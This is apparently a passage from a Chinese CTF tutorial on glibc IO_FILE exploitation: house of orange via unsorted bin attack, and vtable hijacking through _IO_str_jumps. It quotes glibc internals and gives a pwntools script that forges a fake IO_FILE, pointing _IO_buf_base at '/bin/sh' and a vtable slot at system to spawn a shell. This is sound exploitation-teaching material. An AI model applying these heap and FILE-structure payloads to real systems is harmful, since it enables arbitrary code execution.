<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">           Otherwise, make adjustments:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         * If the first time through or noncontiguous, we need to call sbrk</span></span><br><span class="line"><span class="comment">            just to find out where the end of memory lies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         * We need to ensure that all returned chunks from malloc will meet</span></span><br><span class="line"><span class="comment">            MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         * If there was an intervening foreign sbrk, we need to adjust sbrk</span></span><br><span class="line"><span class="comment">            request size to account for fact that we will not be able to</span></span><br><span class="line"><span class="comment">            combine new space with existing space in old_top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         * Almost all systems internally allocate whole pages at a time, in</span></span><br><span class="line"><span class="comment">            which case we might as well use the whole last page of request.</span></span><br><span class="line"><span class="comment">            So we allocate enough more memory to hit a page boundary now,</span></span><br><span class="line"><span class="comment">            which in turn causes future contiguous calls to page-align.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    front_misalign = <span class="number">0</span>;</span><br><span class="line">    end_misalign = <span class="number">0</span>;</span><br><span class="line">    correction = <span class="number">0</span>;</span><br><span class="line">    aligned_brk = brk;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handle contiguous cases */</span></span><br><span class="line">    <span class="keyword">if</span> (contiguous(av)) &#123;</span><br><span class="line">        <span class="comment">/* Count foreign sbrk as system_mem.  */</span></span><br><span class="line">        <span class="keyword">if</span> (old_size)</span><br><span class="line">            av-&gt;system_mem += brk - old_end;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Guarantee alignment of first new chunk made from this space */</span></span><br><span class="line"></span><br><span class="line">        front_misalign = (INTERNAL_SIZE_T) chunk2mem(brk) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">        <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">               Skip over some bytes to arrive at an aligned position.</span></span><br><span class="line"><span class="comment">               We don&#x27;t need to specially mark these wasted front bytes.</span></span><br><span class="line"><span class="comment">               They will never be accessed anyway because</span></span><br><span class="line"><span class="comment">               prev_inuse of av-&gt;top (and any chunk created from its start)</span></span><br><span class="line"><span class="comment">               is always true after initialization.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line">            correction = MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">            aligned_brk += correction;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           If this isn&#x27;t adjacent to existing space, then we will not</span></span><br><span class="line"><span class="comment">           be able to merge with old_top space, so must add to 2nd request.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        correction += old_size;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Extend the end address to hit a page boundary */</span></span><br><span class="line">        end_misalign = (INTERNAL_SIZE_T) (brk + size + correction);</span><br><span class="line">        correction += (ALIGN_UP(end_misalign, pagesize)) - end_misalign;</span><br><span class="line"></span><br><span class="line">        assert(correction &gt;= <span class="number">0</span>);</span><br><span class="line">        snd_brk = (<span class="type">char</span> *) (MORECORE(correction));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           If can&#x27;t allocate correction, try to at least find out current</span></span><br><span class="line"><span class="comment">           brk.  It might be enough to proceed without failing.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           Note that if second sbrk did NOT fail, we assume that space</span></span><br><span class="line"><span class="comment">           is contiguous with first sbrk. This is a safe assumption unless</span></span><br><span class="line"><span class="comment">           program is multithreaded but doesn&#x27;t use locks and a foreign sbrk</span></span><br><span class="line"><span class="comment">           occurred between our first and second calls.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (snd_brk == (<span class="type">char</span> *) (MORECORE_FAILURE)) &#123;</span><br><span class="line">            correction = <span class="number">0</span>;</span><br><span class="line">            snd_brk = (<span class="type">char</span> *) (MORECORE(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* Call the `morecore&#x27; hook if necessary.  */</span></span><br><span class="line">            <span class="type">void</span> (*hook)(<span class="type">void</span>) = atomic_forced_read(__after_morecore_hook);</span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">                (*hook)();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* handle non-contiguous cases */</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">            <span class="comment">/* MORECORE/mmap must correctly align */</span></span><br><span class="line">            assert(((<span class="type">unsigned</span> <span class="type">long</span>) chunk2mem(brk) &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            front_misalign = (INTERNAL_SIZE_T) chunk2mem(brk) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">            <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                   Skip over some bytes to arrive at an aligned position.</span></span><br><span class="line"><span class="comment">                   We don&#x27;t need to specially mark these wasted front bytes.</span></span><br><span class="line"><span class="comment">                   They will never be accessed anyway because</span></span><br><span class="line"><span class="comment">                   prev_inuse of av-&gt;top (and any chunk created from its start)</span></span><br><span class="line"><span class="comment">                   is always true after initialization.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line"></span><br><span class="line">                aligned_brk += MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Find out current end of memory */</span></span><br><span class="line">        <span class="keyword">if</span> (snd_brk == (<span class="type">char</span> *) (MORECORE_FAILURE)) &#123;</span><br><span class="line">            snd_brk = (<span class="type">char</span> *) (MORECORE(<span class="number">0</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Adjust top based on results of second sbrk */</span></span><br><span class="line">    <span class="keyword">if</span> (snd_brk != (<span class="type">char</span> *) (MORECORE_FAILURE)) &#123;</span><br><span class="line">        av-&gt;top = (mchunkptr) aligned_brk;</span><br><span class="line">        set_head(av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);</span><br><span class="line">        av-&gt;system_mem += correction;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           If not the first time through, we either have a</span></span><br><span class="line"><span class="comment">           gap due to foreign sbrk or a non-contiguous region.  Insert a</span></span><br><span class="line"><span class="comment">           double fencepost at old_top to prevent consolidation with space</span></span><br><span class="line"><span class="comment">           we don&#x27;t own. These fenceposts are artificial chunks that are</span></span><br><span class="line"><span class="comment">           marked as inuse and are in any case too small to use.  We need</span></span><br><span class="line"><span class="comment">           two to make sizes and alignments work out.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (old_size != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">               Shrink old_top to insert fenceposts, keeping size a</span></span><br><span class="line"><span class="comment">               multiple of MALLOC_ALIGNMENT. We know there is at least</span></span><br><span class="line"><span class="comment">               enough space in old_top to do this.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            old_size = (old_size - <span class="number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">            set_head(old_top, old_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">               Note that the following assignments completely overwrite</span></span><br><span class="line"><span class="comment">               old_top when old_size was previously MINSIZE.  This is</span></span><br><span class="line"><span class="comment">               intentional. We need the fencepost, even if old_top otherwise gets</span></span><br><span class="line"><span class="comment">               lost.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            chunk_at_offset(old_top, old_size)-&gt;size =</span><br><span class="line">                    (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">            chunk_at_offset(old_top, old_size + <span class="number">2</span> * SIZE_SZ)-&gt;size =</span><br><span class="line">                    (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* If possible, release the rest. */</span></span><br><span class="line">            <span class="keyword">if</span> (old_size &gt;= MINSIZE) &#123;</span><br><span class="line">                _int_free(av, old_top, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0de93e6d5f6cdddac9cd0ff131017791.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
之后是第二部分。首先修改 unsorted chunk 的 size 为 0x61，并且 bk 字段 指向 `_IO_list_all - 0x10` ，同时在 chunk 中伪造 IO_FILE 结构体。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/76ec828172cf2b1303c4a64259731550.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                >
之后申请一个大小不等于 0x60 的 chunk 。

<p>程序首先会在 unsorted bin 中寻找合适的 chunk 。由于 bk 已被修改，不满足 <code>bck == unsorted_chunks (av)</code> ，因此不会从该 chunk 中切下合适的 chunk 然后返回。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">  &#123;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line">    ...</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">        bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">        victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">        (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br></pre></td></tr></table></figure></div>
<p>之后将该 chunk 从 unsorted bin 中取出，从而完成一次 unsorted bin attack 。由于已经保证申请的 chunk 大小与该 chunk 大小不同，因此不会直接将该 chunk 返回，而是直接放到 small bin 中。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">  &#123;</span><br><span class="line">  	...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></div>
<p>最终效果如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f1893892a22542008b7e191d2609727c.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                ><br>之后程序进入 unsorted bin 的第二次循环，由于此时 victim 为 <code>_IO_list_all - 0x10</code>，因此不会通过对 <code>victim-&gt;size</code> 的检查，从而进入 <code>malloc_printerr</code> 函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">  &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">        || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                       chunk2mem (victim), av);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p> 最终，程序会遍历 <code>_IO_list_all</code> 对应的 IO_FILE 链表，并且如果 IO_FILE 结构体满足 <code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> 会调用对应 vtable 中的 <code>_IO_overflow</code> 函数，从而获得 shell 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">malloc_printerr</span> <span class="params">(<span class="type">int</span> action, <span class="type">const</span> <span class="type">char</span> *str, <span class="type">void</span> *ptr, mstate ar_ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>,</span><br><span class="line">                      __libc_argv[<span class="number">0</span>] ? : <span class="string">&quot;&lt;unknown&gt;&quot;</span>, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Abort with an error message.  */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__libc_message (<span class="type">int</span> do_abort, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (do_abort)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="built_in">abort</span> ();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fflush(s) _IO_flush_all_lockp (0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Cause an abnormal program termination with core-dump.  */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">abort</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/* Flush all streams.  We cannot close them now because the user</span></span><br><span class="line"><span class="comment">     might have registered a handler for SIGABRT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (stage == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ++stage;</span><br><span class="line">      fflush (<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	  result = EOF;</span><br><span class="line">      ...</span><br><span class="line">      fp = fp-&gt;_chain;</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>自 glibc-2.27 开始，abort 函数发生较大改动，不再调用 <code>_IO_flush_all_lockp</code> 函数，因此不能利用 malloc_printerr 实现程序执行流劫持。</p>
<h2 id="劫持-vtable-到-IO-str-jumps"><a href="#劫持-vtable-到-IO-str-jumps" class="headerlink" title="劫持 vtable 到 _IO_str_jumps"></a>劫持 vtable 到 _IO_str_jumps</h2><p>以这道<a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/VN2020CTF_easyTHEAP" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为例，libc2.24 在 <code>IO_validate_vtable</code> 函数中对 <code>*vtable</code> 指针进行校验，<code>vtable</code> 必须要满足 在 <code>__stop___IO_vtables</code> 和 <code>__start___libc_IO_vtables</code> 之间，而我们伪造的 <code>vtable</code> 通常不满足这个条件。<br>但是 <code>_IO_str_jumps</code> 与 <code>__IO_wstr_jumps</code> 就位于 <code>__stop___libc_IO_vtables</code> 和 <code>__start___libc_IO_vtables</code> 之间，所以我们是可以利用他们来通过 <code>IO_validate_vtable</code> 的检测的,只需要将 <code>*vtable</code> 填成 <code>_IO_str_jumps</code> 或 <code>__IO_wstr_jumps</code> 地址即可。<br><code>_IO_str_jumps</code> 同样是 <code>_IO_jump_t</code> 类型，但是与与原来的 <code>vtable</code> 指向的 <code>__GI__IO_file_jumps</code> 相比指向的函数不同。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/c7d9dd92c1701cea6ee1e0efca16f645.png"
                      alt="在这里插入图片描述"
                ><br><code>_IO_str_jumps</code> 其中的 <code>_IO_str_finish</code> 直到 libc-2.27 版本都是下面这种实现手段。也就是说，如果修改 <code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code> 为 <code>system</code> 地址，然后修改 <code>fp-&gt;_IO_buf_base</code> 为 <code>/bin/sh</code> 字符串地址，然后触发程序执行 <code>_IO_str_finish</code> 函数就可以得到 shell 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>要想触发程序执行 <code>_IO_str_finish</code> 函数就需要将 <code>vtable</code> 指向 <code>_IO_str_jumps</code> 往上的某个偏移，使得下一个要调用的 <code>vtable</code> 中的函数（最好是第一个被调用的函数，因为 <code>vtable</code> 已经被破坏）的位置恰好是 <code>_IO_str_finish </code> 。<br>由于 edit 函数在 <code>read</code> 改完 <code>_IO_2_1_stdout_</code> 后紧接着调用 <code>printf</code>，而 <code>printf</code> 紧接着会调用 <code>_IO_new_file_xsputn</code> ，因此需要将 <code>vtable</code> 指向 <code>&amp;_IO_str_jumps - 0x28</code> 的位置上。<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/dfc6e89aed90a3a4793adbde3d4f7376.png"
                      alt="在这里插入图片描述"
                ></p>
<p>IO_FILE 的伪造对应与代码中可以有如下定义：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># find _IO_str_jumps</span></span><br><span class="line">IO_file_jumps = libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">IO_str_underflow = libc.symbols[<span class="string">&#x27;_IO_str_underflow&#x27;</span>] - libc.address</span><br><span class="line">IO_str_underflow_ptr = <span class="built_in">list</span>(libc.search(p64(IO_str_underflow)))</span><br><span class="line">IO_str_jumps = IO_str_underflow_ptr[bisect_left(IO_str_underflow_ptr, IO_file_jumps + <span class="number">0x20</span>)] - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># construct the fake file structure</span></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += p64(<span class="number">0xFBAD2886</span>)  <span class="comment"># _flags, an magic word, we need to (0xFBAD2887 &amp; (~0x1)) to clear the _IO_USER_BUF flag to pass the check in _IO_str_finish</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">131</span>) * <span class="number">6</span>  <span class="comment"># from _IO_read_ptr to _IO_write_end</span></span><br><span class="line">fake_file += p64(libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>())  <span class="comment"># _IO_buf_base -&gt; &quot;/bin/sh&quot;</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">132</span>)  <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">4</span>  <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>])  <span class="comment"># the FILE chain ptr</span></span><br><span class="line">fake_file += p32(<span class="number">1</span>)  <span class="comment"># _fileno for stdout is 1</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>)  <span class="comment"># _flags2, usually 0</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)  <span class="comment"># _old_offset, -1</span></span><br><span class="line">fake_file += p16(<span class="number">0</span>)  <span class="comment"># _cur_column</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span>  <span class="comment"># _vtable_offset</span></span><br><span class="line">fake_file += <span class="string">b&quot;\n&quot;</span>  <span class="comment"># _shortbuf[1]</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>)  <span class="comment"># padding</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1e20</span>)  <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)  <span class="comment"># _offset, -1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0xe20</span>)  <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span>  <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">fake_file += p32(<span class="number">0xFFFFFFFF</span>)  <span class="comment"># _mode, -1</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span>  <span class="comment"># _unused2</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xD8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># adjust to vtable</span></span><br><span class="line">fake_file += p64(IO_str_jumps - <span class="number">0x28</span>) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># set the vtable to _IO_str_jumps - 0x28 and set the _IO_2_1_stdout_ + 0xe8 to one_gadget</span></span><br></pre></td></tr></table></figure></div>
<p>libc-2.28 版本起 _IO_str_finish 不再调用 _free_buffer 而是直接是直接调用 free ，因此该方法失效。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="利用-IO-validate-vtable-劫持程序流"><a href="#利用-IO-validate-vtable-劫持程序流" class="headerlink" title="利用 IO_validate_vtable 劫持程序流"></a>利用 IO_validate_vtable 劫持程序流</h2><p>以<a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/33%20xl" >这道题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为例，自 glibc-2.24 起在调用 <code>vtable</code> 中的函数前会调用 <code>IO_validate_vtable</code> 检查 <code>vtable</code> 执向的 <code>_IO_jump_t</code> 的地址是否合法，</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *<span class="title function_">IO_validate_vtable</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span> &#123;</span><br><span class="line">    <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">       section.  */</span></span><br><span class="line">    <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">    <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">    <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">        <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">           slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">        _IO_vtable_check();</span><br><span class="line">    <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> attribute_hidden _IO_vtable_check(<span class="type">void</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">    <span class="type">void</span> (*flag)(<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">       need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">       possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">       boundary.  */</span></span><br><span class="line">    &#123;</span><br><span class="line">        Dl_info di;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">        <span class="keyword">if</span> (!rtld_active()</span><br><span class="line">            || (_dl_addr(_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">                &amp;&amp; l-&gt;l_ns != 